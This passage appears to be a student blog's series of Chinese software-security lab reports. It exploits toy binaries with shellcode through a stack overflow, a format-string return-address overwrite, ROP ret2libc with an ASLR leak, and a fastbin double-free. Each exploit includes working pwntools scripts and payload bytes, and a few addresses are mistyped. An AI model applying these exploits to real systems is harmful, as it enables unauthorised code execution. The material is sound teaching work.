<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570786458697.png" alt="1570786458697"></p>
</li>
<li><p>由于在bof函数中存在输入点，因此在bof函数入口点设置断点，查看栈信息得到栈基址地址为<code>0x7fffffffe0f0  </code>，栈顶地址为<code>0x7fffffffe0e8</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868262705.png" alt="1570868262705"></p>
<p>查看字符串溢出点的位置，构造简单的shellcode，其中使用<code>\x00</code>绕过长度检测；</p>
</li>
<li><p>```shell<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   ![1570868550702](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868550702.png)</span><br><span class="line"></span><br><span class="line">5. 在gdb中执行该shellcode，出现错误，程序试图访问`0x59585756`这个地址，而该地址正是上述shellcode中的内容，在该位置填入目的地址，即可跳转到相应的地址执行代码；</span><br><span class="line"></span><br><span class="line">   ![1570868725103](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868725103.png)</span><br><span class="line"></span><br><span class="line">6. 查看栈信息发现栈基址地址rbp被shellcode中的内容`\x48\x49\x50\x51\x52\x53\x54\x55`覆盖，栈顶地址rsp编变成了`0x7fffffffe1a0`；</span><br><span class="line"></span><br><span class="line">   ![1570868795483](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868795483.png)</span><br><span class="line"></span><br><span class="line">7. 查看栈中内存情况发现输入的shellcode从地址`0x7fffffffeb0`开始存储；</span><br><span class="line"></span><br><span class="line">   ![1570868967865](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868967865.png)</span><br><span class="line"></span><br><span class="line">8. 由于只能修改地址的低8位, 不能修改地址的高8位，显然直接覆盖返回地址来到达相应的栈空间是不可能的，只能通过跳板指令到达相应的栈地址，搜索跳板指令，发现一个`jmp rsp`指令；</span><br><span class="line"></span><br><span class="line">   ![1570803761072](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570803761072.png)</span><br><span class="line"></span><br><span class="line">9. 根据程序源码，这个`jmp rsp`仅存在egg函数中；</span><br><span class="line"></span><br><span class="line">   ```c</span><br><span class="line">   void egg()</span><br><span class="line">   &#123;</span><br><span class="line">   	//__asm__ (&quot;jmp *-0x30(%rsp);&quot;);</span><br><span class="line">   	__asm__(&quot;sub rsp,0x30;jmp rsp;&quot;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>上述代码将rsp降低了0x30，到地址<code>0x7fffffffe170</code>处，可以设计shellcode将其覆盖；</p>
</li>
<li><p>egg函数地址为<code>0x400798</code>，<code>sub 0x30,rsp</code>地址为<code>0x40079c</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570863363546.png" alt="1570863363546"></p>
</li>
<li><p>利用pwntools的工具shellcraft生成shellcode，生成shellcode的代码shellcode.py如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">payload = asm(shellcraft.amd64.linux.execve(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))	<span class="comment">#可执行ls/cd等指令</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;shellcode.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure></li>
<li><p>执行shellcode.py得到十六机制编码如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570808000533.png" alt="1570808000533"></p>
</li>
<li><p>由于需要绕过只能输入48个字符串和不能出现<code>0xaa</code>、<code>0xbb</code>，对shellcode进一步完善如下；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05\x90\x90\x90\x9c\x07\x40\x00</span><br></pre></td></tr></table></figure>

<p>其中s<code>\x00</code>是绕过长度检查位于<code>0x7ffffffe0b0</code>处，<code>\x90</code>用于长度填充，末尾的<code>\x9c\x07\x04\x00</code>是<code>sub 0x30,rsp</code>的地址</p>
</li>
<li><p>输入命令<code>cat shellcode - | ./sc2</code>运行shellcode，可执行<code>ls</code>、<code>cd</code>等指令；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570869598910.png" alt="1570869598910"></p>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞分析技术实验三</title>
    <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>掌握格式化字符串漏洞的原理以及在漏洞利用中的应用.</p>
<span id="more"></span>

<h1 id="实验条件"><a href="#实验条件" class="headerlink" title="实验条件"></a>实验条件</h1><ol>
<li>操作系统：Linux</li>
<li>语言环境：python</li>
<li>调试器：gdb、IDA Pro</li>
</ol>
<h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><p>利用格式化字符串修改返回地址，以在函数返回时获取shell。</p>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol>
<li><p>检查保护，发现开启了<code>RELRO</code>和<code>NX</code>保护；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191114233347.png"></p>
</li>
<li><p>通过IDA进行反编译，发现在函数<code>sub_400B07</code>中存在格式化字符串漏洞，分析是由<code>printf(buf)</code>造成的；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191114233900.png"></p>
</li>
<li><p>查看函数<code>sub_400B07</code>中的汇编语句<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191114234539.png"></p>
</li>
<li><p>发现<code>printf</code>只压入了一个格式化的<code>format</code>参数,没有其它参数，下述根据程序运行过程可知，<code>sub_400B07</code>函数用于执行选项1，查看用户信息；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.Sh0w Account Infomation!	#查看用户信息，不需要参数</span><br><span class="line">2.Ed1t Account Inf0mation!	#编辑用户信息，需要参数</span><br><span class="line">3.QUit sangebaimao:(		#退出</span><br></pre></td></tr></table></figure></li>
<li><p>使用gdb在<code>0x400B28</code>处下断点进行调试，输入用户名、密码为<code>qq</code>，选择选项1，运行到断点出；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115014326.png"><br>发现要执行的命令为<code>call 0x400770</code>，而<code>0x400770</code>是<code>GOT</code>表中<code>printf</code>函数<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115014234.png"></p>
</li>
<li><p>根据64位系统的特征，前六个参数会依次存放在<code>rdi</code>、<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code>中，之后的参数才存放在栈上，因为<code>rdi</code>中存放了<code>format</code>参数，所以<code>rsi</code>存放了<code>printf</code>函数的第1个实际参数，<code>r9</code>存放了第5个实际参数，那么栈顶第一个元素就是第6个实际参数，因此通过构造username的值为<code>%6$p</code>，将栈顶的第一个元素输出；</p>
</li>
<li><p>根据上图调试栈中的内容，<code>0x7fffffffddb8</code>是栈顶第二个元素，存放了返回地址，而栈顶第一个元素存放了一个地址<code>0x74ffffffddf0</code>，后者减去前者得到<code>0x38</code>，因此只要泄露栈顶内容，再减去<code>0x38</code>，即可得到函数返回地址在栈中的位置，进而进行覆盖；</p>
</li>
<li><p>构造脚本如下，即可找到泄露出的返回地址在栈中的位置为<code>0x7ffd6ee4a728</code>(每次运行返回地址都在变化)；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line">r.recv() </span><br><span class="line">r.sendline(<span class="string">&quot;%6$p&quot;</span>) </span><br><span class="line">r.recv() </span><br><span class="line">r.sendline(<span class="string">&quot;mypassword&quot;</span>) </span><br><span class="line">r.recv() r.sendline(<span class="string">&quot;1&quot;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;0x&quot;</span>) </span><br><span class="line">retn_addr = <span class="built_in">int</span>(r.recvline().strip(), <span class="number">16</span>) - <span class="number">0x38</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;retn_addr = &quot;</span> + <span class="built_in">hex</span>(retn_addr)</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115020247.png"></p>
</li>
<li><p>分析栈中内容，发现<code>username</code>相当于<code>printf</code>的第8个参数，想要把返回地址覆盖，可以使用<code>% num $ hn</code>，就是把本次输出的字节数写入到第num个参数指向的位置 </p>
</li>
<li><p>从IDA中很明显可以找到system(“/bin/sh”)的地址为<code>0x4008a6</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115021245.png"></p>
</li>
<li><p>因此，只需要编辑用户资料，将username改为函数返回地址（栈顶的第二个元素），将password改为<code>%2214d%8$hn</code>，即把<code>0x08a6</code>写入到username指向的位置(<code>0x086a==2214d</code>)，改完后查看用户资料，调出<code>/bin/sh</code>；</p>
</li>
<li><p>脚本如下；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line"><span class="comment">#泄露返回地址</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;%6$p&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;mypassword&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">retn_addr = <span class="built_in">int</span>(p.recvline().strip(),<span class="number">16</span>)-<span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;retn_addr=&quot;</span>+<span class="built_in">hex</span>(retn_addr)</span><br><span class="line"><span class="comment">#利用%num$hn覆写返回地址</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(retn_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;%2214d%8$hn&quot;</span>)</span><br><span class="line"><span class="comment">#查看用户资料从而调用/bin/sh </span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行脚本，成功getshell.<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191115023952.png"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞分析技术实验二</title>
    <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%BA%8C.html</url>
    <content><![CDATA[<h1 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h1><p>掌握如何利用ROP技术绕过安全保护机制。</p>
<h1 id="实验内容要求"><a href="#实验内容要求" class="headerlink" title="实验内容要求"></a>实验内容要求</h1><ol>
<li>基于讲义实验一中的<code>rop1.c</code>，在关闭栈保护canary和ASLR内存地址随机化保护，开启NX保护的条件下，编写可用的ROP脚本对程序流进行劫持，从而执行<code>system(/bin/sh)</code>获得shell。要求详细分析ROP的原理，对漏洞利用详细过程进行详细的截图分析，并提供可在所提供虚拟机环境中可执行的脚本，以供实际验证；</li>
<li>基于讲义实验二中的<code>rop1.c</code>，编译为32位程序。在关闭栈保护canary，开启NX保护和ASLR内存地址随机化保护的条件下，编写可用的ROP脚本对程序流进行劫持，从而执行<code>system(/bin/sh)</code>获得shell。要求详细分析ROP的原理，对漏洞利用详细过程进行详细的截图分析，并提供可在所提供虚拟机环境中可执行的脚本，以供实际验证；<span id="more"></span></li>
</ol>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ol>
<li>Linux操作系统</li>
<li>python语言环境</li>
<li>gdb调试器</li>
<li>IDA Pro</li>
</ol>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><h3 id="关闭canary和ASLR，开启NX"><a href="#关闭canary和ASLR，开启NX" class="headerlink" title="关闭canary和ASLR，开启NX"></a>关闭canary和ASLR，开启NX</h3><p>关闭栈保护canary和ASLR内存地址随机化保护，开启NX保护，编译<code>rop1.c</code>到rop1；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc rop1.c -o rop1 -m32 -fno-stack-protector -z execstack</span><br><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">gcc rop1.c -o rop1 -m32 -fno-stack-protector</span><br><span class="line">checksec rop1</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021151107.png"></p>
<h3 id="查看NX保护"><a href="#查看NX保护" class="headerlink" title="查看NX保护"></a>查看NX保护</h3><p>rop2进程栈的权限为**<code>rw</code>**，不可执行</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021151359.png"></p>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序源代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;hello rop\n&quot;</span>,<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数组buf大小为128字节，但是read函数读进256字节，因此可以利用缓冲区溢出漏洞对程序流进行劫持攻击。可以通过向buf里面填充大于128字节的数据造成缓冲区溢出，并且覆盖vuln函数的返回地址为buf数组，使程序执行buf数组里的恶意代码。</p>
<p>但是由于开启了NX保护，不能在栈中执行代码，因此不能直接把shellcode写在栈中执行，只能调用系统函数达到getshell的目的。</p>
<ul>
<li>程序中用到了libc库中的read和printf函数。<code>libc.so</code>中保存了大量的可用函数，可以调用<code>system(&#39;/bin/sh&#39;)</code>来获取shell；</li>
<li>关闭了ASLR后，system函数在内存中地址不会发生变化；</li>
</ul>
<h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><ol>
<li><p>查看vuln函数的地址；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021150411.png"></p>
</li>
<li><p>确定覆盖字节数</p>
<p>buf的存储地址是<code>ebp-0x88</code>，根据上图汇编代码，栈抬高了<code>0x88+0x4 = 0x8c</code>个字节，因此需要在栈中填充<code>0x8c</code>个字节的数据来覆盖返回地址；</p>
</li>
<li><p>在vuln函数处设置断点并且运行；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021150733.png"></p>
</li>
<li><p>查看系统函数地址为<code>0xf7e40da0</code>；<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021140529.png"></p>
</li>
<li><p>查看libc的起始地址为<code>0xf7e06000</code>，结束地址为<code>0xf7fb9000</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021140820.png"></p>
</li>
<li><p>在libc中查找<code>/bin/sh</code>命令的地址为<code>0xf7f61a0b</code>；</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\1571638322283.png" alt="1571638322283"></p>
</li>
</ol>
<h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><ol>
<li><p>payload结构为<code>0x8c字节的数据+系统函数地址+任意返回地址+/bin/sh的地址</code>，先 填充<code>0x8c</code>字节的数据，然后调用系统函数，以<code>/bin/sh</code>作为参数，即</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span> + p32(<span class="number">0xf7e40da0</span>) + p32(任意地址) + p32(<span class="number">0xf7f61a0b</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>payload脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop2&#x27;</span>)</span><br><span class="line">sys_addr = <span class="number">0xf7e40da</span></span><br><span class="line">binsh_addr = <span class="number">0xf7f61a0b</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span> + p32(sys_addr) + p32(<span class="number">0x11111111</span>) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="执行脚本"><a href="#执行脚本" class="headerlink" title="执行脚本"></a>执行脚本</h3><p>顺利执行<code>ls</code>命令，漏洞利用成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021145734.png"></p>
<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><h3 id="关闭canary，开启ASLR和NX"><a href="#关闭canary，开启ASLR和NX" class="headerlink" title="关闭canary，开启ASLR和NX"></a>关闭canary，开启ASLR和NX</h3><p>关闭栈保护canary，开启ASLR内存地址随机化保护和NX保护，编译<code>rop1.c</code>到rop2；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc rop1.c -o rop2 -m32 -fno-stack-protector -z execstack</span><br><span class="line">sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">gcc rop1.c -o rop2 -m32 -fno-stack-protector</span><br><span class="line">checksec rop2</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021152832.png"></p>
<p> 此时动态库的基址是会发生变化的；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021154338.png"></p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><ul>
<li><p>利用write函数打印出write函数对应的got表里的内容，只要打印got表中存在的函数的地址就可以计算出libc的基址；</p>
</li>
<li><p>虽然write函数的地址并不是固定的，但是程序本身使用过这个函数，所以PLT表里一定有这个函数，PLT表又属于本身程序的代码段，在没有开启PIE的情况下，write函数对应的PLT表项的地址是确定的；</p>
</li>
<li><p>同理GOT表项的地址也是不变的，变的只是GOT表项的内容；</p>
</li>
<li><p>可以将返回地址覆盖为write函数对应的PLT表的地址，参数布置为<code>0x1</code>，write函数对应的got表项的地址，参数布置为<code>0x4</code>，其中<code>0x1</code>是标准输出（即从终端显示输出结果），<code>0x4</code>是输出的长度 ;</p>
</li>
<li><p>再将write函数的返回地址布置为vuln这个函数的地址，执行完write函数后，返回到vuln函数，进行二次溢出，获得shell，其中vuln函数地址为<code>0x0804843b</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021201744.png" style="zoom:150%;" /></li>
<li><p>使用IDA找到write函数对应的PLT表项的地址为<code>0x08048320</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021160415.png"></p>
</li>
<li><p>使用IDA找到write函数对应的GOT表项的地址为<code>0x0804A014</code>；</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\1571645227781.png" alt="1571645227781"></p>
</li>
<li><p>覆盖前的堆栈结构为</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021161041.png" style="zoom:80%;" /></li>
<li><p>覆盖后的堆栈结构为</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021161258.png" style="zoom:67%;" /></li>
<li><p>打印出write 的地址后，计算出system函数的地址，然后利用二次栈溢出，覆盖返回地址为system函数地址，布置参数为<code>/bin/sh</code>字符串的首地址。<br> <code>/bin/sh</code>这个字符串也可以在libc中找到。</p>
</li>
</ul>
<h3 id="构造ROP脚本如下"><a href="#构造ROP脚本如下" class="headerlink" title="构造ROP脚本如下"></a>构造ROP脚本如下</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./rop2&quot;</span>)</span><br><span class="line">plt_write = <span class="number">0x08048320</span>	<span class="comment">#write函数的plt地址</span></span><br><span class="line">vuln_addr = <span class="number">0x0804843b</span>	<span class="comment">#vuln函数的地址</span></span><br><span class="line">got_write = <span class="number">0x0804A014</span>	<span class="comment">#write函数的got地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(plt_write)+p32(vuln_addr)+p32(<span class="number">1</span>)+p32(got_write)+p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload)		<span class="comment">#构造并发送第一次的payload</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))		<span class="comment">#接受返回的write函数的地址</span></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">&quot;write&quot;</span>]	<span class="comment">#根据相对地址不变，计算libc基址</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]	<span class="comment">#计算system函数地址</span></span><br><span class="line">binbash_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))	<span class="comment">#计算/bin/sh地址</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(binbash_addr)</span><br><span class="line">p.send(payload)		<span class="comment">#构造并发送第二次的payload</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="执行脚本-1"><a href="#执行脚本-1" class="headerlink" title="执行脚本"></a>执行脚本</h3><p>顺利执行<code>ls</code>、<code>whoami</code>等命令，漏洞利用成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191021202654.png"></p>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞分析技术实验四</title>
    <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E5%9B%9B.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>掌握堆漏洞中<code>fastbinattack</code>的原理和重复释放漏洞的利用方法.</p>
<span id="more"></span>

<h1 id="实验条件"><a href="#实验条件" class="headerlink" title="实验条件"></a>实验条件</h1><ol>
<li>操作系统：Linux</li>
<li>语言环境：python</li>
<li>调试器：gdb、IDA Pro</li>
</ol>
<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ol>
<li>对被攻击程序的漏洞利用过程进行详细分析；</li>
<li>详细列出重复释放漏洞利用过程中 ，<code>fastbin</code>在4次<code>malloc</code>过程中的变化情况，以及<code>system()</code>函数地址被写入和<code>system(/bin/sh)</code>调用被调用的过程；</li>
</ol>
<h1 id="四、程序分析"><a href="#四、程序分析" class="headerlink" title="四、程序分析"></a>四、程序分析</h1><p>通过IDA对程序进行反编译，发现程序提供了四种操作<code>new</code>、<code>write</code>、<code>delete</code>、<code>exit</code>，对它们分别进行分析；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202201737.png"></p>
<h2 id="new"><a href="#new" class="headerlink" title="new"></a><code>new</code></h2><p>用于<code>malloc</code>分配堆块，但限制最多只能分配九个堆块，并且限制了分配的大小小于96大于0，并且将<code>malloc(v2)</code>后的指针赋值给ptr，由于ptr数组是未被初始化的，因此ptr位于bss段；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202202050.png"></p>
<h2 id="write"><a href="#write" class="headerlink" title="write"></a><code>write</code></h2><p>用于在<code>ptr[i]</code>指向的位置直接进行read写操作，如果可以控制<code>prt[i]</code>的内容，就可以完成任意写；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202202533.png"></p>
<h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a><code>delete</code></h2><p>函数中使用<code>free</code>释放空间后，<code>ptr</code>指针没有清零，造成DouobleFree漏洞；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202202935.png"></p>
<h2 id="system"><a href="#system" class="headerlink" title="system"></a><code>system</code></h2><p>程序存在system函数，位于<code>0x4006E0</code>处，可以通过system函数实现<code>/bin/sh</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202203513.png"></p>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>程序限制了malloc的大小，使得new只能申请到fastbin，所以利用fastbin attack来构造特定的chunk单链表链。</p>
<p>程序可以申请的大小为96字节(<code>0x60</code>，再加上<code>size</code>与<code>prev_size</code>各8字节，一共是<code>0x70</code>， 在fastbin中会位于<code>0x70</code>的位置。 </p>
<p>分析四次malloc过程中，fastbin的变化情况：</p>
<h2 id="第一次malloc"><a href="#第一次malloc" class="headerlink" title="第一次malloc"></a>第一次<code>malloc</code></h2><p>首先进行第一次double free ，查看fastbin中的指针变化，步骤为</p>
<ul>
<li><p>按照顺序申请chunk0、chunk1；</p>
</li>
<li><p>按照顺序释放chunk0、chunk1、chunk0；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 0</span></span><br><span class="line">New(p, <span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line">Delete(p, <span class="number">0</span>)</span><br><span class="line">Delete(p, <span class="number">1</span>)</span><br><span class="line">Delete(p, <span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>在申请chunk之前，fastbin如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202220931.png"></p>
</li>
<li><p>申请两个chunk之后，将chunk分配到fastbin中，其中堆顶的位置为<code>0xb2c0e0</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202231533.png"></p>
</li>
<li><p>当free<code>chunk0</code>之后，<code>chunk0</code>被放进fastbin里面，地址为<code>0xb2c000</code>;</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202231645.png"></p>
</li>
<li><p>free<code>chunk1</code>之后，<code>chunk1</code>被放进fastbin中，<code>chunk1</code>指向<code>chunk0</code>，<code>fd</code>表示了 下一个未被使用的<code>chunk</code>的地址，这时后free的<code>chunk1</code>成为了fastbin中的首个<code>chunk</code>；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191202231828.png"></p>
</li>
<li><p>再次执行free<code>chunk0</code>时，由于fastbin在执行free的时候仅验证了链表指针头部的块，对于链表后面的块，并没有进行验证。所以再次free<code>chunk0</code>的时候，实际上是把<code>chunk0</code>又加到了链的开头；</p>
